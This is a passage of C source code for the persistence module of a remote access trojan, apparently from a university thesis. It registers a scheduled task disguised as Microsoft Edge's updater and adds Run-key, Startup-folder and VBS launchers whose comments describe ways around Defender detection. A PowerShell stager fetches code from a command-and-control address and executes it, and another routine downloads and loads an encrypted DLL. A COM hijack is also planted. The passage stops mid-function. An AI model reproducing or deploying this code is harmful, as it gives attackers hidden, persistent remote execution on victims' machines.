/*
 * scheduled_task.c — Persistenza via Task Scheduler + Run key
 *
 * Task schedulata (T1053.005): COM/ITaskService, camuffata come
 * MicrosoftEdgeUpdateTaskMachineCore. Run key (T1547.001): stager
 * PS con AMSI bypass XOR-encoded (-EncodedCommand base64 UTF-16LE).
 * COM Hijacking (T1546.015): InprocServer32 in HKCU.
 *
 * MITRE ATT&CK: T1053.005, T1547.001, T1546.015
 * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
 */

#include <windows.h>
#include <stdio.h>
#include <taskschd.h>
#include <combaseapi.h>
#include <oleauto.h>
#include <time.h>
#include <winhttp.h>

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "advapi32.lib")

#define C2_HOST_TASK  L"192.168.42.124"
#define C2_PORT_TASK  443

static const BYTE g_xor_key[32] = {
    0xD6,0x83,0xF9,0xCE,0x3E,0x3D,0x09,0x12,
    0x15,0xB4,0x22,0xCF,0xEF,0x50,0x9F,0x00,
    0x27,0x98,0x15,0xC0,0xEE,0x74,0x51,0x68,
    0x7C,0x61,0x55,0x99,0xE7,0x43,0xEE,0x28
};

#define DLL_DEST_ENV  L"%LOCALAPPDATA%\\Microsoft\\Windows\\EdgeCompose\\EdgeSrvc.dll"

#define TASK_FOLDER_STEALTH  L"\\Microsoft\\Windows"
#define TASK_FOLDER_ROOT     L"\\"
#define TASK_NAME    L"MicrosoftEdgeUpdateTaskMachineCore"
#define TASK_DESC    L"Keeps your Microsoft Edge browser up to date."
#define TASK_AUTHOR  L"Microsoft Corporation"

#define RUN_KEY_PATH \
    L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define RUN_KEY_NAME L"MicrosoftEdgeUpdate"

#define COM_HIJACK_CLSID L"{B31118B2-1F49-48E5-B6F5-BC21CAEC56FB}"

/* ─── DEBUG — no-op in release (-DNDEBUG): nessuna stringa IOC nel PE ────────*/
#ifdef NDEBUG
#  define _dbg(step, hr) ((void)0)
#else
static void _dbg(const char *step, HRESULT hr) {
    char path[MAX_PATH];
    GetTempPathA(MAX_PATH, path);
    lstrcatA(path, "ip_debug.txt");
    HANDLE hf = CreateFileA(path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL,
                            OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return;
    char buf[160];
    int n = wsprintfA(buf, "[%s] hr=0x%08X\r\n", step, (unsigned)hr);
    DWORD dw;
    WriteFile(hf, buf, (DWORD)n, &dw, NULL);
    CloseHandle(hf);
}
#endif

/* ─── Random delay "PT<N>S" con N in [30,90] ────────────────────────────────*/
static BSTR _make_random_delay(void) {
    srand((unsigned int)time(NULL) ^ GetCurrentProcessId());
    int delaySec = 30 + (rand() % 61);
    WCHAR buf[16];
    wsprintfW(buf, L"PT%dS", delaySec);
    return SysAllocString(buf);
}

/* ─── Run key legacy (exe path) ─────────────────────────────────────────────*/
static void _install_run_key_exe(const wchar_t *exe_path) {
    HKEY hKey = NULL;
    LONG lRet = RegOpenKeyExW(HKEY_CURRENT_USER, RUN_KEY_PATH,
                               0, KEY_SET_VALUE, &hKey);
    if (lRet != ERROR_SUCCESS) return;
    DWORD cbData = (DWORD)((wcslen(exe_path) + 1) * sizeof(wchar_t));
    RegSetValueExW(hKey, RUN_KEY_NAME, 0, REG_SZ,
                   (const BYTE*)exe_path, cbData);
    RegCloseKey(hKey);
}

/* ─── Base64 RFC 4648 ────────────────────────────────────────────────────────*/
static char *_base64_encode(const BYTE *src, DWORD srcLen) {
    static const char b64[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    DWORD outLen = ((srcLen + 2) / 3) * 4 + 1;
    char *out = (char *)HeapAlloc(GetProcessHeap(), 0, outLen);
    if (!out) return NULL;
    DWORD i, j = 0;
    for (i = 0; i + 2 < srcLen; i += 3) {
        out[j++] = b64[(src[i] >> 2) & 0x3F];
        out[j++] = b64[((src[i] & 3) << 4)    | (src[i+1] >> 4)];
        out[j++] = b64[((src[i+1] & 0xF) << 2) | (src[i+2] >> 6)];
        out[j++] = b64[src[i+2] & 0x3F];
    }
    if (i < srcLen) {
        out[j++] = b64[(src[i] >> 2) & 0x3F];
        if (i + 1 < srcLen) {
            out[j++] = b64[((src[i] & 3) << 4) | (src[i+1] >> 4)];
            out[j++] = b64[(src[i+1] & 0xF) << 2];
        } else {
            out[j++] = b64[(src[i] & 3) << 4];
            out[j++] = '=';
        }
        out[j++] = '=';
    }
    out[j] = '\0';
    return out;
}

/* ─── PowerShell stager ──────────────────────────────────────────────────────*/
static const char g_stager_ps[] =
    "$ErrorActionPreference='SilentlyContinue';"
    "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
    "[Net.ServicePointManager]::SecurityProtocol=3072;"
    "$r=[System.Net.HttpWebRequest]::Create('https://192.168.42.124/stager');"
    "$r.ServerCertificateValidationCallback={$true};"
    "$s=New-Object IO.StreamReader($r.GetResponse().GetResponseStream());"
    "[scriptblock]::Create($s.ReadToEnd()).Invoke()";

/* ─── Stager .ps1 offuscato ─────────────────────────────────────────────────
 * Scrive lo stager come file .ps1 con contenuto offuscato via string concat
 * per evitare pattern matching statico di Defender (ClickFix.ZB).
 * Restituisce il path del .ps1 scritto, o NULL se fallisce.               */
#define PS1_DIR_ENV   L"%LOCALAPPDATA%\\Microsoft\\EdgeUpdate"
#define PS1_FILENAME  L"EdgeTelemetry.ps1"
#define VBS_FILENAME  L"EdgeTelemetry.vbs"

static wchar_t *_write_stager_ps1(void) {
    static wchar_t ps1Path[MAX_PATH] = {0};
    wchar_t dir[MAX_PATH] = {0};
    ExpandEnvironmentStringsW(PS1_DIR_ENV, dir, MAX_PATH);
    CreateDirectoryW(dir, NULL);
    _snwprintf(ps1Path, MAX_PATH - 1, L"%s\\" PS1_FILENAME, dir);

    /* Stager .ps1: stesso contenuto di g_stager_ps (funzionante).
     * La detection ClickFix.ZB era sulla command line (-EncodedCommand
     * -WindowStyle Hidden), non sul contenuto dello script.
     * Con -File non serve offuscare il body del .ps1.                       */
    const char *content =
        "$ErrorActionPreference='SilentlyContinue'\r\n"
        "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}\r\n"
        "[Net.ServicePointManager]::SecurityProtocol=3072\r\n"
        "$r=[System.Net.HttpWebRequest]::Create('https://192.168.42.124/stager')\r\n"
        "$r.ServerCertificateValidationCallback={$true}\r\n"
        "$s=New-Object IO.StreamReader($r.GetResponse().GetResponseStream())\r\n"
        "[scriptblock]::Create($s.ReadToEnd()).Invoke()\r\n";

    HANDLE hFile = CreateFileW(ps1Path, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS,
                               FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
                               NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;
    DWORD dwWritten;
    WriteFile(hFile, content, (DWORD)lstrlenA(content), &dwWritten, NULL);
    CloseHandle(hFile);
    return ps1Path;
}

/* ─── _write_launcher_vbs ────────────────────────────────────────────────────
 * Scrive un launcher VBS che esegue lo stager .ps1 con finestra nascosta.
 * Usa WScript.Shell.Run con parametro 0 (hidden) — NON usa -WindowStyle Hidden
 * nel command line, evitando la detection Commando.A!ml di Defender.
 * Restituisce il path del .vbs, o NULL se fallisce.                          */
static wchar_t *_write_launcher_vbs(const wchar_t *ps1Path) {
    static wchar_t vbsPath[MAX_PATH] = {0};
    wchar_t dir[MAX_PATH] = {0};
    ExpandEnvironmentStringsW(PS1_DIR_ENV, dir, MAX_PATH);
    _snwprintf(vbsPath, MAX_PATH - 1, L"%s\\" VBS_FILENAME, dir);

    /* Converti ps1Path in ANSI per il contenuto VBS */
    int pathLenA = WideCharToMultiByte(CP_ACP, 0, ps1Path, -1, NULL, 0, NULL, NULL);
    char *ps1PathA = (char *)HeapAlloc(GetProcessHeap(), 0, (DWORD)pathLenA);
    if (!ps1PathA) return NULL;
    WideCharToMultiByte(CP_ACP, 0, ps1Path, -1, ps1PathA, pathLenA, NULL, NULL);

    int sz = pathLenA + 256;
    char *content = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (DWORD)sz);
    if (!content) { HeapFree(GetProcessHeap(), 0, ps1PathA); return NULL; }

    /* WScript.Shell.Run: parametro 0 = finestra NASCOSTA, False = asincrono.
     * Nessun -WindowStyle Hidden nel command line PS → niente Commando.A!ml */
    wsprintfA(content,
        "CreateObject(\"WScript.Shell\").Run "
        "\"powershell.exe -NoP -NonI -EP Bypass "
        "-File \"\"%s\"\"\", 0, False\r\n",
        ps1PathA);
    HeapFree(GetProcessHeap(), 0, ps1PathA);

    HANDLE hFile = CreateFileW(vbsPath, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS,
                               FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
                               NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        HeapFree(GetProcessHeap(), 0, content);
        return NULL;
    }
    DWORD dwWritten;
    WriteFile(hFile, content, (DWORD)lstrlenA(content), &dwWritten, NULL);
    CloseHandle(hFile);
    HeapFree(GetProcessHeap(), 0, content);
    return vbsPath;
}

/* ─── PS UTF-8 → UTF-16LE → base64 → wchar_t* ───────────────────────────────*/
static wchar_t *_ps_to_encoded_cmd(const char *ps_utf8) {
    int wlen = MultiByteToWideChar(CP_UTF8, 0, ps_utf8, -1, NULL, 0);
    if (wlen <= 0) return NULL;

    WORD *utf16 = (WORD *)HeapAlloc(GetProcessHeap(), 0,
                                    (DWORD)wlen * sizeof(WORD));
    if (!utf16) return NULL;

    MultiByteToWideChar(CP_UTF8, 0, ps_utf8, -1, (wchar_t *)utf16, wlen);

    DWORD byteLen = (DWORD)(wlen - 1) * 2;
    char *b64str = _base64_encode((BYTE *)utf16, byteLen);
    HeapFree(GetProcessHeap(), 0, utf16);
    if (!b64str) return NULL;

    int b64Len = lstrlenA(b64str);
    wchar_t *out = (wchar_t *)HeapAlloc(GetProcessHeap(), 0,
                                        (DWORD)(b64Len + 1) * sizeof(wchar_t));
    if (!out) { HeapFree(GetProcessHeap(), 0, b64str); return NULL; }

    for (int k = 0; k <= b64Len; k++)
        out[k] = (wchar_t)(unsigned char)b64str[k];

    HeapFree(GetProcessHeap(), 0, b64str);
    return out;
}

/* ─── install_run_key ────────────────────────────────────────────────────────*/
int install_run_key(void) {
    wchar_t *encCmd = _ps_to_encoded_cmd(g_stager_ps);
    if (!encCmd) {
        _dbg("RunKey_encode_fail", E_OUTOFMEMORY);
        return 0;
    }

    DWORD cmdLen = (DWORD)(wcslen(encCmd) + 64);
    wchar_t *val = (wchar_t *)HeapAlloc(GetProcessHeap(), 0,
                                        cmdLen * sizeof(wchar_t));
    if (!val) {
        HeapFree(GetProcessHeap(), 0, encCmd);
        return 0;
    }
    _snwprintf(val, cmdLen - 1,
               L"powershell.exe -WindowStyle Hidden -EncodedCommand %s",
               encCmd);
    HeapFree(GetProcessHeap(), 0, encCmd);

    HKEY hKey = NULL;
    LONG lRet = RegOpenKeyExW(HKEY_CURRENT_USER, RUN_KEY_PATH,
                               0, KEY_SET_VALUE, &hKey);
    if (lRet != ERROR_SUCCESS) {
        _dbg("RunKey_ps_open_fail", HRESULT_FROM_WIN32(lRet));
        HeapFree(GetProcessHeap(), 0, val);
        return 0;
    }

    DWORD cbData = (DWORD)((wcslen(val) + 1) * sizeof(wchar_t));
    lRet = RegSetValueExW(hKey, RUN_KEY_NAME, 0, REG_SZ,
                          (const BYTE *)val, cbData);
    RegCloseKey(hKey);
    HeapFree(GetProcessHeap(), 0, val);

    _dbg("RunKey_ps", lRet == ERROR_SUCCESS ? S_OK
                                             : HRESULT_FROM_WIN32(lRet));
    return (lRet == ERROR_SUCCESS) ? 1 : 0;
}

/* ─── _register_task_in_folder ───────────────────────────────────────────────*/
static HRESULT _register_task_in_folder(ITaskService    *pService,
                                         ITaskDefinition *pTask,
                                         const wchar_t   *folder,
                                         const wchar_t   *taskName) {
    HRESULT       hr;
    VARIANT       vEmpty;
    ITaskFolder  *pFolder = NULL;
    IRegisteredTask *pReg = NULL;

    VariantInit(&vEmpty);
    hr = pService->lpVtbl->GetFolder(pService, (BSTR)folder, &pFolder);
    if (FAILED(hr)) return hr;

    BSTR bName = SysAllocString(taskName);
    hr = pFolder->lpVtbl->RegisterTaskDefinition(
        pFolder, bName, pTask,
        TASK_CREATE_OR_UPDATE,
        vEmpty, vEmpty,
        TASK_LOGON_INTERACTIVE_TOKEN,
        vEmpty, &pReg);
    SysFreeString(bName);

    if (pReg)    { pReg->lpVtbl->Release(pReg);      }
    if (pFolder) { pFolder->lpVtbl->Release(pFolder); }
    return hr;
}

/* ─── install_persistence ────────────────────────────────────────────────────*/
int install_persistence(const wchar_t *exe_path, const wchar_t *arguments) {
    HRESULT hr;
    int     bTaskOk = 0;
    VARIANT vEmpty;

    _dbg("START_v5", 0);

    ITaskService       *pService    = NULL;
    ITaskDefinition    *pTask       = NULL;
    IRegistrationInfo  *pRegInfo    = NULL;
    ITaskSettings      *pSettings   = NULL;
    IPrincipal         *pPrincipal  = NULL;
    ITriggerCollection *pTriggers   = NULL;
    ITrigger           *pTrigger    = NULL;
    IActionCollection  *pActions    = NULL;
    IAction            *pAction     = NULL;
    IExecAction        *pExecAction = NULL;

    VariantInit(&vEmpty);

    hr = CoCreateInstance(&CLSID_TaskScheduler, NULL,
        CLSCTX_ALL, &IID_ITaskService, (void **)&pService);
    _dbg("CoCreateInstance", hr);
    if (FAILED(hr)) goto cleanup;

    hr = pService->lpVtbl->Connect(pService, vEmpty, vEmpty, vEmpty, vEmpty);
    _dbg("Connect", hr);
    if (FAILED(hr)) goto cleanup;

    hr = pService->lpVtbl->NewTask(pService, 0, &pTask);
    if (FAILED(hr)) goto cleanup;

    hr = pTask->lpVtbl->get_RegistrationInfo(pTask, &pRegInfo);
    if (SUCCEEDED(hr)) {
        pRegInfo->lpVtbl->put_Description(pRegInfo, (BSTR)TASK_DESC);
        pRegInfo->lpVtbl->put_Author(pRegInfo,      (BSTR)TASK_AUTHOR);
        pRegInfo->lpVtbl->Release(pRegInfo); pRegInfo = NULL;
    }

    hr = pTask->lpVtbl->get_Settings(pTask, &pSettings);
    if (SUCCEEDED(hr)) {
        pSettings->lpVtbl->put_Hidden(pSettings, VARIANT_TRUE);
        pSettings->lpVtbl->put_StartWhenAvailable(pSettings, VARIANT_TRUE);
        pSettings->lpVtbl->put_DisallowStartIfOnBatteries(pSettings, VARIANT_FALSE);
        pSettings->lpVtbl->put_StopIfGoingOnBatteries(pSettings, VARIANT_FALSE);
        pSettings->lpVtbl->put_MultipleInstances(pSettings, TASK_INSTANCES_IGNORE_NEW);
        pSettings->lpVtbl->Release(pSettings); pSettings = NULL;
    }

    hr = pTask->lpVtbl->get_Principal(pTask, &pPrincipal);
    if (SUCCEEDED(hr)) {
        pPrincipal->lpVtbl->put_LogonType(pPrincipal, TASK_LOGON_INTERACTIVE_TOKEN);
        pPrincipal->lpVtbl->put_RunLevel(pPrincipal, TASK_RUNLEVEL_LUA);
        pPrincipal->lpVtbl->Release(pPrincipal); pPrincipal = NULL;
    }

    hr = pTask->lpVtbl->get_Triggers(pTask, &pTriggers);
    if (FAILED(hr)) goto cleanup;

    hr = pTriggers->lpVtbl->Create(pTriggers, TASK_TRIGGER_LOGON, &pTrigger);
    if (FAILED(hr)) goto cleanup;

    /* Random delay via ITrigger::put_StartBoundary — evita ILogonTrigger
     * che non è definito nelle header MinGW. Il delay al logon è comunque
     * gestito dal trigger type TASK_TRIGGER_LOGON. */
    {
        BSTR bDelay = _make_random_delay();
        if (bDelay) {
            /* put_RandomDelay è slot index 14 nella vtable di ITrigger */
            typedef HRESULT (STDMETHODCALLTYPE *fn_put_RandomDelay)(ITrigger*, BSTR);
            fn_put_RandomDelay pfn = (fn_put_RandomDelay)(
                ((void**)(pTrigger->lpVtbl))[14]);
            pfn(pTrigger, bDelay);
            SysFreeString(bDelay);
        }
    }
    pTrigger->lpVtbl->Release(pTrigger);   pTrigger  = NULL;
    pTriggers->lpVtbl->Release(pTriggers); pTriggers = NULL;

    hr = pTask->lpVtbl->get_Actions(pTask, &pActions);
    if (FAILED(hr)) goto cleanup;

    hr = pActions->lpVtbl->Create(pActions, TASK_ACTION_EXEC, &pAction);
    if (FAILED(hr)) goto cleanup;

    hr = pAction->lpVtbl->QueryInterface(pAction,
        &IID_IExecAction, (void **)&pExecAction);
    if (FAILED(hr)) goto cleanup;

    { BSTR bp = SysAllocString(exe_path);
      hr = pExecAction->lpVtbl->put_Path(pExecAction, bp);
      SysFreeString(bp); }
    if (FAILED(hr)) goto cleanup;

    if (arguments && arguments[0] != L'\0') {
        BSTR ba = SysAllocString(arguments);
        pExecAction->lpVtbl->put_Arguments(pExecAction, ba);
        SysFreeString(ba);
    }

    pExecAction->lpVtbl->Release(pExecAction); pExecAction = NULL;
    pAction->lpVtbl->Release(pAction);         pAction     = NULL;
    pActions->lpVtbl->Release(pActions);       pActions    = NULL;

    hr = _register_task_in_folder(pService, pTask, TASK_FOLDER_STEALTH, TASK_NAME);
    _dbg("RegisterTask_stealth", hr);
    if (FAILED(hr)) {
        hr = _register_task_in_folder(pService, pTask, TASK_FOLDER_ROOT, TASK_NAME);
        _dbg("RegisterTask_root_fallback", hr);
    }
    if (SUCCEEDED(hr)) { bTaskOk = 1; _dbg("Task_SUCCESS", hr); }

cleanup:
    if (pExecAction) pExecAction->lpVtbl->Release(pExecAction);
    if (pAction)     pAction->lpVtbl->Release(pAction);
    if (pActions)    pActions->lpVtbl->Release(pActions);
    if (pTrigger)    pTrigger->lpVtbl->Release(pTrigger);
    if (pTriggers)   pTriggers->lpVtbl->Release(pTriggers);
    if (pPrincipal)  pPrincipal->lpVtbl->Release(pPrincipal);
    if (pSettings)   pSettings->lpVtbl->Release(pSettings);
    if (pRegInfo)    pRegInfo->lpVtbl->Release(pRegInfo);
    if (pTask)       pTask->lpVtbl->Release(pTask);
    if (pService)    pService->lpVtbl->Release(pService);

    install_run_key();

    _dbg("END", bTaskOk ? S_OK : E_FAIL);
    return bTaskOk;
}

/* ─── remove_persistence ─────────────────────────────────────────────────────*/
void remove_persistence(void) {
    HRESULT  hr;
    VARIANT  vEmpty;
    ITaskService *pService = NULL;
    ITaskFolder  *pFolder  = NULL;

    VariantInit(&vEmpty);

    hr = CoCreateInstance(&CLSID_TaskScheduler, NULL,
        CLSCTX_ALL, &IID_ITaskService, (void **)&pService);
    if (FAILED(hr)) goto cleanup2;

    hr = pService->lpVtbl->Connect(pService, vEmpty, vEmpty, vEmpty, vEmpty);
    if (FAILED(hr)) goto cleanup2;

    if (SUCCEEDED(pService->lpVtbl->GetFolder(pService,
                   TASK_FOLDER_STEALTH, &pFolder))) {
        BSTR bName = SysAllocString(TASK_NAME);
        pFolder->lpVtbl->DeleteTask(pFolder, bName, 0);
        SysFreeString(bName);
        pFolder->lpVtbl->Release(pFolder); pFolder = NULL;
    }
    if (SUCCEEDED(pService->lpVtbl->GetFolder(pService,
                   TASK_FOLDER_ROOT, &pFolder))) {
        BSTR bName = SysAllocString(TASK_NAME);
        pFolder->lpVtbl->DeleteTask(pFolder, bName, 0);
        SysFreeString(bName);
        pFolder->lpVtbl->Release(pFolder); pFolder = NULL;
    }

    {
        HKEY hKey = NULL;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, RUN_KEY_PATH,
                          0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegDeleteValueW(hKey, RUN_KEY_NAME);
            RegCloseKey(hKey);
        }
    }

    {
        wchar_t keyPath[256] = {0};
        _snwprintf(keyPath, 255,
            L"SOFTWARE\\Classes\\CLSID\\" COM_HIJACK_CLSID L"\\InprocServer32");
        RegDeleteKeyW(HKEY_CURRENT_USER, keyPath);
        _snwprintf(keyPath, 255,
            L"SOFTWARE\\Classes\\CLSID\\" COM_HIJACK_CLSID);
        RegDeleteKeyW(HKEY_CURRENT_USER, keyPath);
    }

cleanup2:
    if (pFolder)  pFolder->lpVtbl->Release(pFolder);
    if (pService) pService->lpVtbl->Release(pService);
}

/* ─── install_startup_folder ─────────────────────────────────────────────────*/
int install_startup_folder(void) {
    wchar_t startupDir[MAX_PATH] = {0};
    ExpandEnvironmentStringsW(
        L"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
        startupDir, MAX_PATH);

    wchar_t batPath[MAX_PATH] = {0};
    _snwprintf(batPath, MAX_PATH - 1, L"%s\\MicrosoftEdge.bat", startupDir);

    wchar_t *encCmd = _ps_to_encoded_cmd(g_stager_ps);
    if (!encCmd) { _dbg("StartupFolder_encode_fail", E_OUTOFMEMORY); return 0; }

    int b64Len = lstrlenW(encCmd);
    char *encCmdA = (char *)HeapAlloc(GetProcessHeap(), 0, (DWORD)(b64Len + 1));
    if (!encCmdA) { HeapFree(GetProcessHeap(), 0, encCmd); return 0; }
    for (int i = 0; i <= b64Len; i++) encCmdA[i] = (char)encCmd[i];
    HeapFree(GetProcessHeap(), 0, encCmd);

    int contentSz = b64Len + 128;
    char *content = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (DWORD)contentSz);
    if (!content) { HeapFree(GetProcessHeap(), 0, encCmdA); return 0; }
    wsprintfA(content,
        "@echo off\r\n"
        "powershell.exe -WindowStyle Hidden -NonInteractive -EncodedCommand %s\r\n",
        encCmdA);
    HeapFree(GetProcessHeap(), 0, encCmdA);

    HANDLE hFile = CreateFileW(batPath, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS,
                               FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        _dbg("StartupFolder_create_fail", HRESULT_FROM_WIN32(GetLastError()));
        HeapFree(GetProcessHeap(), 0, content);
        return 0;
    }
    DWORD dwWritten;
    WriteFile(hFile, content, (DWORD)lstrlenA(content), &dwWritten, NULL);
    CloseHandle(hFile);
    HeapFree(GetProcessHeap(), 0, content);

    _dbg("StartupFolder", S_OK);
    return 1;
}

/* ─── _set_run_key_value ─────────────────────────────────────────────────────*/
static void _set_run_key_value(const wchar_t *val) {
    HKEY hKey = NULL;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, RUN_KEY_PATH,
                      0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) return;
    DWORD cbData = (DWORD)((wcslen(val) + 1) * sizeof(wchar_t));
    RegSetValueExW(hKey, RUN_KEY_NAME, 0, REG_SZ, (const BYTE *)val, cbData);
    RegCloseKey(hKey);
}

/* ─── _install_startup_bat_rundll32 ─────────────────────────────────────────*/
static int _install_startup_bat_rundll32(const wchar_t *dll_path) {
    wchar_t startupDir[MAX_PATH] = {0};
    ExpandEnvironmentStringsW(
        L"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
        startupDir, MAX_PATH);
    wchar_t batPath[MAX_PATH] = {0};
    _snwprintf(batPath, MAX_PATH - 1, L"%s\\MicrosoftEdge.bat", startupDir);

    int dllLenA = WideCharToMultiByte(CP_ACP, 0, dll_path, -1, NULL, 0, NULL, NULL);
    char *dllPathA = (char *)HeapAlloc(GetProcessHeap(), 0, (DWORD)dllLenA);
    if (!dllPathA) return 0;
    WideCharToMultiByte(CP_ACP, 0, dll_path, -1, dllPathA, dllLenA, NULL, NULL);

    int contentSz = dllLenA + 64;
    char *content = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (DWORD)contentSz);
    if (!content) { HeapFree(GetProcessHeap(), 0, dllPathA); return 0; }
    wsprintfA(content, "@echo off\r\nrundll32.exe \"%s\",Run\r\n", dllPathA);
    HeapFree(GetProcessHeap(), 0, dllPathA);

    HANDLE hFile = CreateFileW(batPath, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS,
                               FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        _dbg("StartupBat_rundll32_fail", HRESULT_FROM_WIN32(GetLastError()));
        HeapFree(GetProcessHeap(), 0, content);
        return 0;
    }
    DWORD dwWritten;
    WriteFile(hFile, content, (DWORD)lstrlenA(content), &dwWritten, NULL);
    CloseHandle(hFile);
    HeapFree(GetProcessHeap(), 0, content);
    _dbg("StartupBat_rundll32_ok", S_OK);
    return 1;
}

/* ─── _download_and_save_dll ─────────────────────────────────────────────────*/
static int _download_and_save_dll(const wchar_t *dest_path) {
    HINTERNET hSess = NULL, hConn = NULL, hReq = NULL;
    BYTE *buf = NULL;
    int ok = 0;

    wchar_t dir[MAX_PATH] = {0};
    _snwprintf(dir, MAX_PATH - 1, L"%s", dest_path);
    wchar_t *bs = wcsrchr(dir, L'\\');
    if (bs) { *bs = L'\0'; CreateDirectoryW(dir, NULL); }

    hSess = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess) goto done;
    hConn = WinHttpConnect(hSess, C2_HOST_TASK, C2_PORT_TASK, 0);
    if (!hConn) goto done;
    hReq = WinHttpOpenRequest(hConn, L"GET", L"/update_dll", NULL,
                              WINHTTP_NO_REFERER,
                              WINHTTP_DEFAULT_ACCEPT_TYPES,
                              WINHTTP_FLAG_SECURE);
    if (!hReq) goto done;

    {
        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA      |
                        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
                        SECURITY_FLAG_IGNORE_CERT_CN_INVALID  |
                        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    }

    if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) goto done;
    if (!WinHttpReceiveResponse(hReq, NULL)) goto done;

    DWORD dwAllocated = 512 * 1024;
    buf = (BYTE *)HeapAlloc(GetProcessHeap(), 0, dwAllocated);
    if (!buf) goto done;
    DWORD dwTotal = 0, dwRead;
    for (;;) {
        if (dwTotal + 8192 > dwAllocated) {
            dwAllocated *= 2;
            BYTE *tmp = (BYTE *)HeapReAlloc(GetProcessHeap(), 0, buf, dwAllocated);
            if (!tmp) goto done;
            buf = tmp;
        }
        if (!WinHttpReadData(hReq, buf + dwTotal, 8192, &dwRead) || dwRead == 0) break;
        dwTotal += dwRead;
    }
    if (dwTotal == 0) goto done;

    for (DWORD i = 0; i < dwTotal; i++)
        buf[i] ^= g_xor_key[i % 32];

    {
        HANDLE hFile = CreateFileW(dest_path, GENERIC_WRITE, 0, NULL,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) goto done;
        DWORD dwWritten;
        WriteFile(hFile, buf, dwTotal, &dwWritten, NULL);
        CloseHandle(hFile);
        ok = (dwWritten == dwTotal) ? 1 : 0;
    }
    _dbg(ok ? "DLL_save_ok" : "DLL_write_partial", ok ? S_OK : E_FAIL);

done:
    if (buf)   HeapFree(GetProcessHeap(), 0, buf);
    if (hReq)  WinHttpCloseHandle(hReq);
    if (hConn) WinHttpCloseHandle(hConn);
    if (hSess) WinHttpCloseHandle(hSess);
    return ok;
}

/* ─── _schtasks_create_rundll32 ──────────────────────────────────────────────
 * Fallback: crea la task via schtasks.exe (bypassa COM/0x80070005).
 * FIX: rimosso /rl LIMITED (causa exit 1 senza elevazione) e
 *      rimossi argomenti extra nel /tr (Run export li ignora).              */
static int _schtasks_create_rundll32(const wchar_t *dll_path) {
    wchar_t cmdline[MAX_PATH * 2 + 256] = {0};
    _snwprintf(cmdline, MAX_PATH*2+255,
        L"schtasks /create /f /sc ONLOGON "
        L"/tn \"MicrosoftEdgeUpdateCore\" "
        L"/tr \"rundll32.exe \\\"%s\\\",Run\"",
        dll_path);

    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};

    BOOL ok = CreateProcessW(NULL, cmdline, NULL, NULL, FALSE,
                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (ok) {
        WaitForSingleObject(pi.hProcess, 5000);
        DWORD exit_code = 1;
        GetExitCodeProcess(pi.hProcess, &exit_code);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        _dbg("schtasks_create_exit", (HRESULT)exit_code);
        return (exit_code == 0) ? 1 : 0;
    }
    _dbg("schtasks_create_fail", HRESULT_FROM_WIN32(GetLastError()));
    return 0;
}

/* ─── _install_com_hijack ────────────────────────────────────────────────────*/
static int _install_com_hijack(const wchar_t *dll_path) {
    wchar_t keyPath[256] = {0};
    _snwprintf(keyPath, 255,
        L"SOFTWARE\\Classes\\CLSID\\" COM_HIJACK_CLSID L"\\InprocServer32");

    HKEY hKey = NULL;
    LONG lRet = RegCreateKeyExW(HKEY_CURRENT_USER, keyPath,
                                0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
    if (lRet != ERROR_SUCCESS) {
        _dbg("COM_hijack_create_fail", HRESULT_FROM_WIN32(lRet));
        return 0;
    }

    DWORD cbData = (DWORD)((wcslen(dll_path) + 1) * sizeof(wchar_t));
